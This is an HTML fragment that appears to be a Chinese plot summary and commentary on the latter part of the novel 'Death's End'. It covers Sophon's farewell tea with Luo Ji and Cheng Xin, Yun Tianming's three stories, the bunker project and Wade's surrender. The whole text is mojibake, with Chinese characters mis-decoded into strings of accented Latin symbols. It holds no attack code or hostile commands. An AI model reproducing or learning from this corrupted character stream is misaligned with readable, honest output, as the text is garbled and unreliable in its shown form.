´åäº†æ°´æ»´çš„å†…éƒ¨ï¼Œéšåï¼Œè“è‰²ç©ºé—´å¥½é€šè¿‡æ€ç»´ç©ºé—´è¿›å…¥äº†ä¸‡æœ‰å¼•åŠ›å·ï¼Œå¹¶æ§åˆ¶äº†è¿™è‰˜é£èˆ¹ã€‚ä¸ä¹…åï¼Œè“è‰²ç©ºé—´å·å¸æ”¶äº†å¤–æœ‰å¼•åŠ›å·ä¸Šçš„ä¸¤ç™¾å¤šä½èˆ¹å‘˜ã€‚ç»è¿‡é›†ä½“å•†è®®ï¼Œä»–ä»¬è®¤ä¸ºä¸‰ä½“äººåº”è¯¥å·²ç»å é¢†äº†åœ°çƒï¼Œæ‰“ç ´äº†å’Œå¹³åè®®ã€‚æœ€ç»ˆï¼Œå¤§å®¶å†³å®šï¼Œé€šè¿‡ä¸‡æœ‰å¼•åŠ›å·ï¼Œå‘å®‡å®™å‘å‡ºä¸‰ä½“æ’æ˜Ÿçš„åæ ‡ï¼Œè¿›è¡Œæ‰“å‡»æŠ¥å¤ã€‚è¿™ä¸¤è‰˜é£èˆ¹å±¥è¡Œå®Œäº†å¯¹äººç±»æœ€åçš„è´£ä»»ï¼Œä¾¿ç»§ç»­å‘æ˜Ÿæµ·æ·±å¤„é£˜å»ã€‚</p><p>&emsp;&emsp;ä¸‡æœ‰å¼•åŠ›å·å‘å®‡å®™å‘å‡ºä¸‰ä½“çš„æ’å¿ƒåæ ‡åï¼Œä¸‰ä½“ä¸–ç•Œçš„æ’æ˜Ÿé©¬ä¸Šå°±è¢«ä¸€é¢—å…‰ç²’ç©¿è¿‡ï¼Œè¢«å½»åº•æ¯ç­äº†ã€‚ä»æ­¤äººä»¬è¿›å…¥äº†å¹¿æ’­çºªå…ƒã€‚</p><p>&emsp;&emsp;å¤§ç§»æ°‘å®Œæˆåçš„ç¬¬å…­å¤©ï¼Œä¸‰ä½“æ’è¡Œæ˜Ÿè¢«æ‘§æ¯äº†ã€‚ä¸‰ä½“äººå½»åº•æ”¾å¼ƒäº†å é¢†åœ°çƒï¼Œå› ä¸ºä»–ä»¬çŸ¥é“ï¼Œç”±äºä¸¤ä¸ªæ–‡æ˜é—´é•¿å¹´ç´¯æœˆçš„é€šè®¯ï¼Œä¸‰ä½“æ–‡æ˜è¢«æ‰“å‡»åï¼Œå¤ªé˜³ç³»è¢«æ¯ç­ä¹Ÿåªæ˜¯æ—¶é—´é—®é¢˜ã€‚æ™ºå­æ”¾å¼ƒäº†ç§»æ°‘è®¡åˆ’ï¼Œè‹¦éš¾ç»“æŸäº†ã€‚äººä»¬å››å¤„æ¬¢å‘¼ã€‚</p><p>&emsp;&emsp;å¹¿æ’­çºªå…ƒä¸ƒå¹´ï¼ŒAAåœ¨æ¾³å¤§åˆ©äºšæ²¡ç•™å¤šä¹…ï¼Œè¿™äº›å¹´å¥¹ç¨‹å¿ƒçš„å…¬å¸æ‰“ç†çš„å¾ˆå¥½ï¼Œæˆä¸ºäº†å¤ªç©ºå»ºç­‘ä¸šçš„å·¨å¤´ã€‚é‚£äº›ä¸‰ä½“äººçš„äººç±»æ²»å®‰å†›ä»¬å¼€å§‹è¢«æ¸…ç®—ï¼Œæ— æ•°çš„æ²»å®‰å†›è¢«åˆ¤å¤„æ­»åˆ‘æˆ–ç›‘ç¦ã€‚å››å¹´åï¼Œäººä»¬åœ¨åœ°çƒä¸Šè§‚æµ‹åˆ°äº†ä¸‰ä½“æ¯æ˜Ÿçš„æ¯ç­ï¼Œå¨èƒäº†äººç±»è¿‘ä¸‰ä¸ªä¸–çºªçš„ä¸‰ä½“ä¸–ç•Œï¼Œè¢«å½»åº•æ‘§æ¯äº†ã€‚æ™ºå­åœ¨å¹¿æ’­çºªå…ƒåˆæ¶ˆå¤±äº†ï¼Œå¶å°”ä¹Ÿä¼šä½œä¸ºä¸‰ä½“ä¸–ç•Œçš„ä¼ å£°ç­’å‡ºç°ã€‚ä¸ºä»€ä¹ˆäººç±»ç°åœ¨ä¸å»å¹²æ‰æ™ºå­ï¼Œåˆ«å¿˜äº†ï¼Œæ°´æ»´è¿˜åœ¨åœ°çƒä¸Šå‘¢ã€‚</p><p>&emsp;&emsp;æœ‰ä¸€å¤©ï¼Œæ™ºå­çªç„¶è¯·ç½—è¾‘å’Œç¨‹å¿ƒå»å¥¹å®¶é‡Œå–èŒ¶ï¼Œæƒ³å’Œè¿™ä¸¤ä¸ªè€æœ‹å‹å™å™æ—§ã€‚äººä»¬åŠå…¶é‡è§†è¿™æ¬¡ä¼šè°ˆï¼Œå¸Œæœ›ä»–ä»¬èƒ½å¸¦å›ä¸€äº›æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œå½“æ‰€æœ‰äººçŸ¥é“ä¸‰ä½“ä¸–ç•Œè¢«æ¯ç­åï¼Œæ™ºå­æ›¾ä»£è¡¨å…¨ä¸‰ä½“äººåœ¨å›½é™…ç¤¾ä¼šå‘è¡¨äº†ä¸€æ®µç®€çŸ­çš„è®²è¯ã€‚è¯è¯­é‡Œæ²¡æœ‰è°´è´£ï¼Œæ²¡æœ‰æ€¨æ¨ï¼Œæ²¡æœ‰è¯„ä»·ï¼Œåªæ˜¯ç®€å•é€šæŠ¥äº†ç¾éš¾è¿‡ç¨‹ã€‚ä¸‰ä½“æ–‡æ˜ä»æ­¤å¼€å§‹äº†æ˜Ÿèˆ°æ–‡æ˜ã€‚</p><p>&emsp;&emsp;ç½—è¾‘å’Œç¨‹å¿ƒè¿›å…¥äº†æ™ºå­çš„å®¶é‡Œã€‚éšåï¼Œå¼€å§‹äº†å…·æœ‰é‡è¦å†å²æ„ä¹‰çš„èŒ¶é“è°ˆè¯ã€‚è¿™åœºè°ˆè¯ä¸€å¼€å§‹ï¼Œç¨‹å¿ƒå°±æ€¥äºè¯¢é—®å„ç§é—®é¢˜ï¼Œæ™ºå­ç»™å‡ºçš„å›ç­”ï¼Œå¤§æ¦‚å°±æ˜¯ï¼Œå¤ªé˜³ç³»è¢«æ‘§æ¯æ˜¯è‚¯å®šçš„ï¼Œä½†éœ€è¦ä¸€æ®µæ—¶é—´ã€‚å¯èƒ½æœ‰ä¸€ä¸¤ä¸ªä¸–çºªã€‚å½“åŠ¡ä¹‹æ€¥ï¼Œå°±æ˜¯èµ¶ç´§è·‘ã€‚éšåï¼Œæ™ºå­å¸Œæœ›ä¸è¦å†è¢«æé—®ã€‚å¥¹è¯´ï¼Œæˆ‘è¯·äºŒä½ï¼Œæ˜¯æ¥å–èŒ¶é“åˆ«çš„ã€‚æ­¤æ—¶ï¼Œä¸€ç›´æ²‰é»˜çš„ç½—è¾‘å¼€å£è¯´ï¼Œæˆ‘å¯ä»¥å†é—®ä¸€ä¸ªé—®é¢˜ä¹ˆï¼Ÿæ™ºå­è¯·ç½—è¾‘ç¨ç­‰ä¸€ä¸‹ï¼Œæ²‰æ€è¿‡åå¯¹ç½—è¾‘è¯´é“ï¼Œå¯ä»¥ï¼Œè¿™æ˜¯å‡ºäºæˆ‘ä»¬ä¸‰ä½“äººå¯¹ç½—è¾‘æ‚¨çš„å°Šé‡ï¼Œä½†æˆ‘åªèƒ½å›ç­”ä½ ï¼Œæ˜¯ï¼Œä¸æ˜¯æˆ–ä¸çŸ¥é“ã€‚ç„¶åï¼Œæˆ‘ä¾¿ä¸ä¼šå†å›ç­”äºŒä½ä»»ä½•é—®é¢˜äº†ã€‚ç½—è¾‘ä¸æ¯«æ²¡æœ‰çŠ¹è±«ï¼Œé—®å‡ºäº†æœ€åä¸€ä¸ªé—®é¢˜ã€‚åœ¨å®‡å®™ä¸­å­˜ä¸å­˜åœ¨ä¸€ç§å®‰å…¨å£°æ˜ï¼Œå¯ä»¥é¿å…é»‘æš—æ£®æ—æ‰“å‡»ã€‚æ•´ä¸ªå±‹å­å¯‚é™äº†å¾ˆä¹…ï¼Œæ™ºå­ç»ˆäºå¼€å£äº†ï¼Œå¥¹è¯´ï¼Œæœ‰ã€‚</p><p>&emsp;&emsp;èŒ¶é“è°ˆè¯ç»“æŸäº†ï¼Œæ‰€æœ‰äººéƒ½åœ¨æ€è€ƒå¦‚ä½•å‘å¸ƒå®‰å…¨å£°æ˜ã€‚å®—æ•™æ€»æ˜¯åœ¨äººä»¬æ¶ˆæçš„æ—¶ä»£å…´æ—ºï¼Œåœ°çƒé€æ¸æˆä¸ºä¸€ä¸ªå¤§æ•™å ‚ï¼Œä¸€é¢—ç¥ˆç¥·ä¹‹æ˜Ÿã€‚ç”±äºä¸‰ä½“äººçŸ¥é“å¦‚ä½•å‘å¸ƒå®‰å…¨å£°æ˜ï¼Œä¸‰ä½“æˆä¸ºäº†äººä»¬å¿ƒä¸­çš„ç¥ï¼Œæ™ºå­æˆä¸ºäº†è¢«ç¥ˆç¥·çš„å¯¹è±¡ã€‚æ™ºå­çš„å®¶é—¨å£ï¼Œæ¯æ—¥éƒ½æœ‰æˆåƒä¸Šä¸‡çš„äººåœ¨æ­¤ç¥ˆç¥·ï¼Œä½†æ™ºå­æ¯æ¬¡ä¹Ÿåªæ˜¯å‘ä¼—äººå¾®å¾®é èº¬ï¼Œç„¶åæ‚„ç„¶é€€å»ã€‚æ™ºå­è¦ç¦»å¼€çš„é‚£ä¸€å¤©åˆ°äº†ï¼Œå®ƒä¼šç¦»å¼€è¿™ä¸ªç¾ä¸½çš„èº¯å£³ï¼Œé£å¾€ä¸‰ä½“èˆ°é˜Ÿã€‚å¥¹æœ€åä¸€æ¬¡ä¼šè§äº†ç½—è¾‘å’Œç¨‹å¿ƒï¼Œè¿™æ¬¡ï¼Œä¸‰ä¸ªäººæ²¡è¯´ä»€ä¹ˆè¯ï¼Œå› ä¸ºä»–ä»¬éƒ½çŸ¥é“ï¼Œè¯¥è¯´çš„éƒ½è¯´å®Œäº†ã€‚æ™ºå­æ‰“ç ´äº†å¯‚é™ï¼Œå¥¹è¯´ï¼Œæˆ‘è¦èµ°äº†ï¼Œè¯·äºŒä½å¤šå¤šä¿é‡ã€‚å®‡å®™å¾ˆå¤§ï¼Œç”Ÿæ´»æ›´å¤§ï¼Œä¹Ÿè®¸ä»¥åè¿˜æœ‰ç¼˜å†è§ã€‚è¿˜æœ‰ï¼Œç¨‹å¿ƒï¼Œäº‘å¤©æ˜è¦è§ä½ ã€‚</p><p>&emsp;&emsp;ä¸‰ä½“æ–‡æ˜æ¯”åœ°çƒæ–‡æ˜å¼ºå¤§å¤ªå¤šäº†ï¼Œäººç±»åœ¨ä¸‰ä½“äººçœ¼é‡Œå°±æ˜¯è™«å­ï¼Œä¸‰ä½“äººé¢å¯¹è™«å­çš„å¨èƒï¼Œè¡¨ç°å‡ºæ¥çš„ä¸æ˜¯æ†‹å±ˆï¼Œä¸æ˜¯ä¸æƒ…æ„¿ï¼Œè€Œæ˜¯éå¸¸çœŸè¯šï¼Œä½†åˆä¸åœåœ°ç¾¤é’Šæ‰“ç ´è¿™ç§å¹³è¡¡çš„å¯èƒ½ï¼Œè¿™æ‹›ç”¨çš„å¥½å‰å®³ã€‚å·®ç‚¹å°±æŠŠäººç±»ç»™æå®šäº†ã€‚çœ‹æ¥ä¸æ‡‚è®¡è°‹çš„ä¸‰ä½“äººï¼Œè·Ÿäººç±»æ‰“äº¤é“çš„è¿™300å¤šå¹´é‡Œï¼Œè·Ÿç€å­¦ä¼šäº†ä¸å°‘é˜´æ‹›ã€‚ä¸¤ä¸ªæ–‡æ˜çš„å¹³è¡¡ï¼Œå°±æ¡åœ¨æ‰§å‰‘äººæ‰‹é‡Œï¼Œä¸€ä¸ªåˆæ ¼çš„æ‰§å‰‘äººæ‰èƒ½ä¿æŒè¿™ç§å¹³è¡¡ã€‚å¯æƒœï¼Œæƒ³ç”¨çˆ±æ‹¯æ•‘ä¸–ç•Œçš„ç¨‹å¿ƒä¸æ˜¯è¿™ä¸ªäººï¼Œåœ¨ä¸‰ä½“çš„æ¯æ˜Ÿè¢«æ‘§æ¯åï¼Œä¸‰ä½“äººé¢å¯¹è‡ªå·±çš„å®¿æ•Œï¼Œè¡¨ç°å‡ºäº†å¾—ä½“ã€ç¤¼è²Œå’Œæˆç†Ÿï¼Œæ²¡æœ‰ä¸æ¯«æ€¨æ¨ï¼Œä¹Ÿæ²¡æœ‰è°ˆè®ºæ˜¯éï¼Œä»…ç”¨å¹³æ·¡çš„èŒ¶ä¼šç»“æŸäº†300å¤šå¹´çš„å¯¹å†³ã€‚</p><h3 id="æ­»ç¥æ°¸ç”Ÿ-ä¸‹"><a href="#æ­»ç¥æ°¸ç”Ÿ-ä¸‹" class="headerlink" title="æ­»ç¥æ°¸ç”Ÿ ä¸‹"></a>æ­»ç¥æ°¸ç”Ÿ ä¸‹</h3><p>&emsp;&emsp;æ™ºå­å¯¹ç¨‹å¿ƒè¯´ï¼Œäº‘å¤©æ˜è¦è§ä½ ï¼Œè¿™å¥è¯ä»ä½•è¯´èµ·ã€‚åŸæ¥ï¼Œå½“åˆä¸‰ä½“äººä¸€ç›´å…³æ³¨ç€é˜¶æ¢¯è®¡åˆ’ï¼Œå½“ç¬¬ä¸€æ‰¹ä¸‰ä½“èˆ°é˜Ÿï¼Œå› ä¸ºç½—è¾‘çš„å¨èƒè¢«è¿«ç¦»å¼€å¤ªé˜³ç³»åï¼Œä»–ä»¬å†³å®šï¼Œå»æ‰¾è£…æœ‰äº‘å¤©æ˜å¤§è„‘çš„æ¢æµ‹å™¨ä½œä¸ºçºªå¿µå“ã€‚</p><p>&emsp;&emsp;ä»äº‘å¤©æ˜èƒ½è§ç¨‹å¿ƒæ¥çœ‹ï¼Œäº‘å¤©æ˜åœ¨ä¸‰ä½“é£èˆ¹é‚£é‡Œæ··å¾—è¿˜ç®—ä¸é”™ã€‚ä¸‰ä½“äººä¸¥æ­£å£°æ˜ï¼Œè¿™åªæ˜¯äº‘å¤©æ˜å’Œç¨‹å¿ƒä¸¤ä¸ªäººä¹‹é—´çš„äº‹ï¼ŒåŒæ–¹ä¸èƒ½æåŠä¸‰ä½“æ–‡æ˜ï¼Œä¼šé¢ä¸å¾—æœ‰ç¬¬ä¸‰æ–¹åœ¨åœºï¼Œä¹Ÿä¸èƒ½ä»¥ä»»ä½•å½¢å¼è®°å½•ï¼Œä¸ºäº†ä¿è¯éš”ç¦»æ€§ï¼Œè¿™æ¬¡ä¼šé¢è®¾ç«‹åœ¨å¤ªç©ºä¸­ã€‚ç¨‹å¿ƒä¹˜åé£èˆ¹é£åˆ°æŒ‡å®šåœ°ç‚¹åï¼Œæ™ºå­å°†ç®€å†è¿œç¨‹çš„å®æ—¶è§†é¢‘é€šè®¯ã€‚å¦‚æœä¸‰ä½“äººå‘ç°ï¼Œè°ˆè¯ä¸­è®¾è®¡ä¸å…è®¸æåŠçš„å†…å®¹ï¼Œé‚£ä¹ˆï¼Œç¨‹å¿ƒå¾—é£è¡Œå™¨å°†ä¼šçˆ†ç‚¸ã€‚</p><p>&emsp;&emsp;é€šè®¯å¼€å§‹äº†ï¼Œç¨‹å¿ƒçœ‹åˆ°äº†äº‘å¤©æ˜ï¼Œä»–çš„èº«ä½“è¢«ä¸‰ä½“äººå¤åŸäº†ï¼Œäº‘å¤©æ˜çœ‹èµ·æ¥å¾ˆå¥åº·ï¼Œå¾ˆå¹´è½»ã€‚äº‘å¤©æ˜å‘Šè¯‰ç¨‹å¿ƒï¼Œä»–åœ¨ä¸‰ä½“é£èˆ¹ä¸Šå¹³æ—¶é™¤äº†ç§åœ°æ¶ˆé£ï¼Œå°±æ˜¯ç»™ä¸‰ä½“äººçš„å­©å­ä»¬è®²æ•…äº‹ã€‚è¿™é‡Œé¡ºå¸¦ä¸€æï¼Œç”±äºä¸‰ä½“æ–‡æ˜æ–‡åŒ–çš„åŒ®ä¹ï¼Œæ‰€ä»¥ä¸‰ä½“äººç‰¹åˆ«å–œæ¬¢æŒºäº‘å¤©æ˜è®²æ•…äº‹ã€‚äº‘å¤©æ˜è¿˜åœ¨é‚£å‡ºäº†ä¹¦ï¼Œæˆä¸ºäº†ä¸‰ä½“ä¸–ç•ŒçŸ¥åçš„æ–‡å­¦å®¶ã€‚ç”±äºä¸‰ä½“äººå·²çŸ¥ç›‘è§†ç€è¿™åœºè°ˆè¯ï¼Œäº‘å¤©æ˜åœ¨è·Ÿç¨‹å¿ƒèŠäº†å¾ˆå¤šå®¶å¸¸è¯åï¼Œä¾¿ç»™ä»–è®²äº†ä¸‰ä¸ªä»–åœ¨é£èˆ¹ä¸Šç»å¸¸ç»™ä¸‰ä½“äººè®²çš„æ•…äº‹ã€‚è°ˆè¯ä¾¿ç»“æŸäº†ã€‚åœ¨æœ€åçš„ä¸€åˆ†é’Ÿï¼Œç¨‹å¿ƒå¯¹äº‘å¤©æ˜æå‡ºäº†çº¦ä¼šé‚€è¯·ï¼Œå¥¹è¯´ï¼Œå®‡å®™å¾ˆå¤§ï¼Œç”Ÿæ´»æ›´å¤§ï¼Œæˆ‘ä»¬è¿˜ä¼šç›¸è§çš„ã€‚å¦‚æœæœ‰æœºä¼šï¼Œå°±åœ¨ä½ é€ç»™æˆ‘çš„é‚£é¢—æ˜Ÿæ˜Ÿä¸Šè§é¢å§ã€‚äº‘å¤©æ˜åœ¨æœ€åä¸€åˆ»å›ç­”åˆ°ï¼Œå¥½ï¼Œåœ¨æˆ‘ä»¬çš„æ˜Ÿæ˜Ÿã€‚</p><p>&emsp;&emsp;é€šè®¯ç»“æŸã€‚å½“ç¨‹å¿ƒè¿”èˆªåï¼Œè¢«ç«‹é©¬å¸¦è¿›äº†ä¸€ä¸ªå°æˆ¿é—´ï¼Œè¿™ä¸ªæˆ¿é—´æ˜¯æ™ºå­ç›²åŒºã€‚è™½ç„¶ä¸‰ä½“äººå·²ç»æ˜ç¡®è¡¨ç¤ºï¼Œæ™ºå­ä¼šå…¨éƒ¨æ’¤ç¦»åœ°çƒï¼Œå•ä½äº†ä¿é™©èµ·è§ï¼Œä¸ºäº†äº‘å¤©æ˜çš„å®‰å…¨ï¼Œéœ€è¦åœ¨è¿™é‡Œè®°å½•ä¸‹è°ˆè¯çš„å†…å®¹ã€‚ç¨‹å¿ƒåœ¨è¿”ç¨‹ä¸­ï¼Œå¿ƒç†ä¸æ–­èƒŒç€äº‘å¤©æ˜ç»™å¥¹å°†çš„ä¸‰ä¸ªæ•…äº‹ï¼Œå› ä¸ºå¥¹çŸ¥é“ï¼Œè¿™ä¸‰ä¸ªæ•…äº‹å°±æ˜¯æ‹¯æ•‘åœ°çƒçš„å…³é”®ï¼Œé€šè¿‡é•¿æ—¶é—´çš„è§£è¯»ï¼Œäººä»¬ç»ˆäºå‘ç°äº†éšè—åœ¨è¿™ä¸‰ä¸ªæ•…äº‹ä¸­çš„ç§˜å¯†ã€‚</p><p>&emsp;&emsp;1ã€å…‰é€Ÿé£èˆ¹çš„æ³•å‘å±•æ–¹å‘åº”ä½¿ç”¨ç©ºé—´æ›²ç‡é©±åŠ¨å™¨ï¼Œè¿™ç§é©±åŠ¨å™¨æ˜¯é€šè¿‡å½±å“ç©ºé—´ï¼Œåˆ©ç”¨ç©ºé—´çš„æ›²ç‡æŠŠé£èˆ¹æ‹‰è‡³å…‰é€Ÿã€‚æ‰“ä¸ªæ¯”æ–¹ï¼Œå°±åƒåœ¨å°çº¸èˆ¹çš„èˆ¹å°¾ï¼Œè£…ä¸€å—å°é¦™çš‚ï¼Œèˆ¹ä¼šè‡ªåŠ¨å‘å‰ã€‚è¿™æ˜¯å› ä¸ºè‚¥çš‚æ”¹å˜äº†æ°´çš„å¼ åŠ›ï¼Œä½†èˆ¹å‰æ–¹æ°´é¢çš„å¼ åŠ›ä¸å˜ï¼Œä»è€ŒæŠŠèˆ¹æ‹‰äº†è¿‡å»ã€‚2ã€ç”¨ä¸€å±‚ä½å…‰é€Ÿå¸¦åŒ…è£¹ä½å¤ªé˜³ç³»ï¼Œè¿™å°±æ˜¯å…¨å®‡å®™é€šç”¨çš„å®‰å…¨ç”Ÿå£°æ˜ã€‚è¿™ä¸ªè¢«åŒ…è£¹çš„åŒºåŸŸè¢«ç§°ä¹‹ä¸ºé»‘åŸŸï¼Œåœ¨è¿™ä¸ªé»‘åŸŸé‡Œï¼Œæ²¡æœ‰é£èˆ¹å¯ä»¥é£å‡ºå»ï¼Œé»‘åŸŸæ˜¯ä¸€ä¸ªå®Œå…¨å°é—­çš„ç©ºé—´ï¼Œåœ¨è¿™é‡Œï¼Œäººä»¬å¯ä»¥è·å¾—å®‰å…¨ï¼Œä½†ä¼šå¤±å»è‡ªç”±ã€‚3ã€‚æœ€åä¸€ä¸ªç§˜å¯†æš‚ä¸”ä¸è¡¨ï¼Œå› ä¸ºç›´åˆ°æœ€åï¼Œæœ‰äººæ‰å‘ç°äº†å®ƒã€‚</p><p>&emsp;&emsp;ä¸‰ä½“äººå½»åº•ç¦»å¼€è€Œæ¥å¤ªé˜³ç³»ã€‚ä¸ä¹…åäººä»¬ä¸ºäº†é¿å…è¢«å…‰ç²’æ‰“å‡»çš„ç¾éš¾ï¼Œå¼€å§‹äº†ï¼Œæ©ä½“å·¥ç¨‹ã€‚ä»€ä¹ˆæ˜¯æ©ä½“å·¥ç¨‹å‘¢ï¼Ÿä»¥æœ¨æ˜Ÿã€åœŸæ˜Ÿã€å¤©ç‹æ˜Ÿå’Œæµ·ç‹æ˜Ÿå››å¤§å·¨æ˜Ÿä¸ºæ©ä½“ï¼Œåœ¨ä»–ä»¬çš„èƒŒé˜³é¢å»ºé€ å¤ªç©ºåŸã€‚ä¸ºä»€ä¹ˆäººä»¬ä¸é€ å…‰é€Ÿé£èˆ¹å‡†å¤‡è·‘è·¯å‘¢ï¼Ÿä¸€æ–¹é¢å…‰é€Ÿé£èˆ¹ä¼šåœ¨å¤ªç©ºä¸­ç•™ä¸‹å°è®°ï¼Œå¾ˆå®¹æ˜“è¢«é«˜çº§æ–‡æ˜è§‚æµ‹åˆ°ï¼›å¦ä¸€æ–¹é¢ï¼Œåœ¨è¿™ä¸ªæ—¶ä»£äººæƒæ„è¯†æå¼ºï¼Œå› ä¸ºåªæœ‰å°‘éƒ¨åˆ†äººèƒ½ç¦»å¼€ï¼Œå¤§éƒ¨åˆ†äººè¦ç•™ä¸‹ï¼Œæ‰€ä»¥åˆ¶é€ å…‰é€Ÿé£èˆ¹æˆä¸ºäº†ä¸¥é‡çš„è¿æ³•è¡Œä¸ºã€‚ä½†ç¨‹å¿ƒå’ŒAAçŸ¥é“ï¼Œå»ºé€ å…‰é€Ÿé£èˆ¹æ‰æ˜¯äººç±»çš„å‡ºè·¯ã€‚</p><p>&emsp;&emsp;æœ‰ä¸€å¤©ï¼Œç»´å¾·æ‰¾åˆ°äº†ç¨‹å¿ƒï¼Œå¯¹å¥¹è¯´ï¼Œé€ å…‰é€Ÿé£èˆ¹æ˜¯ä¸€æ¡æ­£ç¡®çš„è·¯ã€‚ä½†ä½ æ²¡æœ‰åŠ›é‡é€ å‡ºæ¥ï¼ŒæŠŠä½ æ‹¥æœ‰çš„ä¸€åˆ‡èµ„æºç»™æˆ‘ï¼Œè®©æˆ‘æ¥ï¼Œç»´å¾·éšåçš„ä¸€å¥è¯è®©ç¨‹å¿ƒåŒæ„äº†ã€‚ä»–å†·é™çš„å¯¹ç¨‹å¿ƒè¯´ï¼Œä¸è¦çŠ¯ç¬¬äºŒæ¬¡é”™ï¼Œæ€ç´¢è‰¯ä¹…åï¼Œç¨‹å¿ƒç­”åº”äº†ç»´å¾·ã€‚ä½†å¥¹æœ‰ä¸ªæ¡ä»¶ï¼Œå¥¹è¯´ï¼Œå½“ä½ åšçš„äº‹å±å®³äººç±»çš„ç”Ÿå‘½æ—¶ï¼Œæˆ‘å¯ä»¥æ”¶å›ä½ çš„æƒåˆ©ã€‚ç»´å¾·ç­”åº”äº†ã€‚ç¨‹å¿ƒå’ŒAAè¿›å…¥äº†å†¬çœ ï¼Œç­‰å¾…æˆæœã€‚æ¥ä¸‹æ¥ï¼Œç¨‹å¿ƒå¾—å…¬å¸å…¨æƒç”±ç»´å¾·è´Ÿè´£ã€‚</p><p>&emsp;&emsp;æ©ä½“çºªå…ƒåä¸€å¹´ï¼Œæ²‰ç¡äº†62å¹´çš„ç¨‹å¿ƒè¢«å”¤é†’ï¼Œç”±äºå¤šæ¬¡å†¬çœ ï¼Œç¨‹å¿ƒç°åœ¨çš„å®é™…å¹´é¾„æ˜¯33å²ï¼Œåœ¨è¿™ä¸ªå¹³å‡å¯¿å‘½150å²çš„å¹´ä»£é‡Œï¼Œå¥¹è¿˜æ˜¯ä¸ªå°‘å¥³ã€‚åœ¨è¿™ä¸ªçºªå…ƒï¼Œå½¢æˆäº†å››ä¸ªå¤ªç©ºåŸç¾¤è½ï¼Œåˆ†åˆ«åˆ†å¸ƒåœ¨æœ¨æ˜Ÿã€åœŸæ˜Ÿã€å¤©ç‹æ˜Ÿã€æµ·ç‹æ˜Ÿçš„èƒŒé˜³é¢ï¼Œåœ°çƒæˆä¸ºäº†å¤ªé˜³ç³»è”é‚¦ä¸­çš„ä¸€ä¸ªæ™®é€šåŸé‚¦ã€‚ç°åœ¨åœ°çƒä¸Šï¼ŒäººçƒŸç¨€å°‘ï¼Œåªæœ‰äº”ç™¾ä¸‡ä¸æ€•æ­»çš„äººç”Ÿæ´»åœ¨é‚£é‡Œï¼Œæ¯ä¸ªäººåœ¨é‚£ç”Ÿæ´»å¾—åƒå›½ç‹ä¸€æ ·ï¼Œå¤§è‡ªç„¶é‡æ–°å é¢†äº†åœ°çƒã€‚å¾ˆå¤šäººä¸æ„¿æ„ç•™åœ¨åœ°çƒæ˜¯å› ä¸ºï¼Œå¦‚æœå¤ªé˜³ç³»é­å—å…‰ç²’æ‰“å‡»ï¼Œé‚£ä¹ˆåœ°çƒä¸Šçš„äººå°†æ— ä¸€å¹¸å…ã€‚ç¨‹å¿ƒè¢«å¸¦åˆ°äº†ä¸€åº§å«æ˜Ÿç¯åŸçš„å¤ªç©ºåŸï¼Œä»–åœ¨è¿™è§åˆ°äº†ä¸€ç™¾å¤šå²çš„ç»´å¾·ã€‚ç»´å¾·ä¸€ç›´åœ¨ç ”å‘å…‰é€Ÿé£èˆ¹ï¼Œç°åœ¨å·²ç»å°æœ‰æˆæœã€‚ä½†å°±åœ¨å…³é”®æ—¶åˆ»ï¼Œç”±äºè”é‚¦æ”¿åºœçš„åå¤é˜»æŒ ï¼Œç»´å¾·ä¸ä»–ä»¬æ’•ç ´äº†è„¸ï¼Œç»´å¾·ç°åœ¨è¢«æ”¿åºœå†›åŒ…å›´ã€‚ä½†ä»¥ç»´å¾·ç°åœ¨çš„å®åŠ›ï¼Œä»–å¯ä»¥æ‹¼æ­»ä¸€æï¼Œæ–—ä¸ªé±¼æ­»ç½‘ç ´ã€‚ä½†ä»–å¯¹ç¨‹å¿ƒæœ‰æ‰¿è¯ºï¼Œæ”¿åºœå”¤é†’ç¨‹å¿ƒå¾—åŸå› ï¼Œå°±æ˜¯å¸Œæœ›å¥¹å¯ä»¥æƒç»´å¾·æ”¾ä¸‹æ­¦å™¨ã€‚ç»è¿‡ç»´å¾·å…­åå¹´çš„åŠªåŠ›ï¼Œæ›²ç‡é©±åŠ¨å™¨å·²ç»ç ”åˆ¶çš„å·®ä¸å¤šäº†ï¼Œæ˜¯å¦èƒ½å¤Ÿç»§ç»­ï¼Œå°±çœ‹ç¨‹å¿ƒä¸€å¥è¯ã€‚ç¨‹å¿ƒç°åœ¨æƒ³ï¼Œå¦‚æœæˆ˜æ–—å¼€å§‹ï¼Œæˆåƒä¸Šä¸‡äººä¼šæ­»äºéå‘½ï¼Œå–„è‰¯çš„ç¨‹å¿ƒå¯¹ç»´å¾·è¯´å—ï¼Œä½ çš„è¯ºè¨€è¿˜æœ‰æ•ˆå—ï¼Ÿç»´å¾·ç‚¹äº†ç‚¹å¤´ï¼Œç¨‹å¿ƒè¯´é“ï¼Œå¥½ï¼Œç«‹åˆ»åœæ­¢ä¸€åˆ‡ã€‚ç»´å¾·è¿‘ä¹æ³è¯·çš„è¯´åˆ°ï¼Œå†è€ƒè™‘ä¸€ä¸‹å§ï¼Œç¨‹å¿ƒåšå®šçš„è¯´ï¼Œä¸éœ€è¦è€ƒè™‘ã€‚ç»´å¾·æ— åŠ©çš„è¯´åˆ°ï¼Œå¤±å»äººæ€§ï¼Œå¤±å»å¾ˆå¤šï¼›å¤±å»å…½æ€§ï¼Œå¤±å»ä¸€åˆ‡ã€‚ç¨‹å¿ƒæœæ–­çš„å›ç­”é“ï¼Œæˆ‘é€‰æ‹©äººæ€§ã€‚</p><p>&emsp;&emsp;ç°åœºå¯‚é™äº†ï¼Œç»´å¾·è®©ä¼—äººæ”¾ä¸‹æ­¦å™¨ï¼Œå‡†å¤‡æŠ•é™ã€‚ç»´å¾·å¿ƒä¸­å‹‡å¾€ç›´å‰çš„ç«ç„°ç†„ç­äº†ã€‚ä»–å¾®ç¬‘çš„å¯¹ç¨‹å¿ƒè¯´ï¼Œå°å¥³å­©ï¼Œä½ çœ‹æˆ‘éµå®ˆäº†è¯ºè¨€ã€‚ä¸ä¹…åï¼Œè¢«æ•çš„ç»´å¾·è¢«å¤„ä»¥æ­»åˆ‘ã€‚ç¨‹å¿ƒæƒ³åˆ°æœªæ¥ï¼Œå»çœ‹å¤ªé˜³ç³»è¢«æ‰“å‡»åçš„ä¸–ç•Œã€‚ä¾¿å†æ¬¡è¿›å…¥äº†å†¬çœ 